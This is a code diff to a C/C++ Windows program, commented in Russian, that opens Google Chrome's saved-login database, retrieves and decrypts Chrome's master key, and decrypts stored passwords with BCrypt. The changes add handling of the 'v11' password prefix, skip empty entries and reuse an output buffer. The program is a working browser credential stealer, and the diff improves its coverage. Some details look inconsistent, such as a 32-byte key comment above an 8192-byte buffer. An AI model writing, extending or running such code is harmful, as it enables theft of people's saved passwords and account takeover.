@@ -15,6 +15,7 @@
 #define NONCE_LEN 12
 #define MAX_SIZE_PASS 1*1024
 
+static char* pbOutput = NULL;
 static BCRYPT_ALG_HANDLE hAlg;
 static BCRYPT_KEY_HANDLE hKey;
 
@@ -189,15 +190,6 @@ static BOOL KeyDecrypt(char* keyBase64, DWORD keySize, char* decKey)
     return FALSE;
 }
 
-static void GetNonce(char* decKey, DWORD decKeySize, BYTE* nonce)
-{
-    //nonce - первые 12 байт (префикс "v10" не учитывается)
-    for (int i = V10_LEN; i < (NONCE_LEN + V10_LEN); i++)
-    {
-        nonce[i] = decKey[i];
-    }
-}
-
 static BOOL GetCromeDbPath(char* chromeDbPath)
 {
     //получаем путь до AppData
@@ -277,6 +269,16 @@ int main()
         char* username = (char*)sqlite3_column_text(stmt, 1);
         char* password = (char*)sqlite3_column_text(stmt, 2);
 
+        if (url == nullptr || username == nullptr || password == nullptr)
+        {
+            break;
+        }
+
+        if ((strlen(url) == 0) || (strlen(username) == 0) || (strlen(password) == 0))
+        {
+            continue;
+        }
+
         printf("Url: %s\n", url);
         printf("Username: %s\n", username);
 
@@ -284,13 +286,12 @@ int main()
         char decryptedPass[1024];
         DWORD decPassSize = 0;
 
-        if ((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '0')
+        if (((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '0') ||
+            ((char)password[0] == 'v' && (char)password[1] == '1' && (char)password[2] == '1'))
         {
             static char keyBase64[1024];
             DWORD keySize = 0;
-            char decryptedKey[32]; //ключ размером 32 байта (256 бит)
-
-            BYTE nonce[12];
+            char decryptedKey[8192]; //ключ размером 32 байта (256 бит)
 
             if (!GetChromeKey(keyBase64, &keySize))
             {
@@ -303,16 +304,17 @@ int main()
             }
 
             DWORD decKeySize = strlen(decryptedKey);
-            GetNonce(decryptedKey, decKeySize, nonce);
 
             Init_for_chrome_80();
             Init_key_for_chrome_80((PBYTE)decryptedKey, decKeySize);
 
-            char* pbOutput = NULL;
-            pbOutput = (char*)malloc(MAX_SIZE_PASS);
-            if (pbOutput == NULL) {
-                printf("No free memory");
-                return (-1);
+            if (pbOutput == NULL)
+            {
+                pbOutput = (char*)malloc(MAX_SIZE_PASS);
+                if (pbOutput == NULL) {
+                    printf("No free memory");
+                    return (-1);
+                }
             }
 
             ULONG cbOutput = MAX_SIZE_PASS;
@@ -348,7 +350,6 @@ int main()
                 printf("Decryptintg error!\n");
             }
         }
-
         entries++;
     }
     while (1);
